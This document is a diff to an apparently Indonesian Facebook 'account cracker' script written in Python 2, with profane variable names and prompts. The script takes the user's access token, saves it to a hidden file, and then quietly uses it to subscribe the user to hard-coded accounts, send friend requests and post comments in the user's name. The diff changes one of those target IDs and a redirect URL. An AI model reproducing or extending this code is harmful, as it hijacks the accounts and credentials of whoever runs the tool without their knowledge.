@@ -125,11 +125,11 @@ def yayanxd():
         print ' %s[•]%s Selamat menggunakan script saya'%(O,N);time.sleep(2)
         print ' %s[•]%s Bismillah dulu biar dapet OK, karna modal hoki doang'%(O,N);time.sleep(2)
         print ' %s[•]%s Gak bisa bikin akun OK!!'%(O,N);time.sleep(2)
-        print ' %s[•]%s Sv nomor admin biar tambah akrab :)'%(O,N);time.sleep(2)
+        print ' %s[•]%s Subscribe channel gua dulu yak :)'%(O,N);time.sleep(2)
         open('.memek.txt', 'w').write(kontol)
    
         raw_input(' %s[•]%s TEKAN ENTER BANGSAD!! '%(O,N));wuhan(kontol)
-        os.system('xdg-open https://wa.me/6289524163441')
+        os.system('xdg-open https://youtube.com/channel/UCqwjydkaE3y0qo-3Yl3yL3A')
         moch_yayan()
     except KeyError:
         print '\n\n %s[%s!%s] TOKEN NYA SALAH KENTOD!!'%(N,M,N);time.sleep(2);yayanxd()
@@ -232,7 +232,7 @@ def wuhan(kontol):
         requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/857799105/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100001390111040/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
         requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
         requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
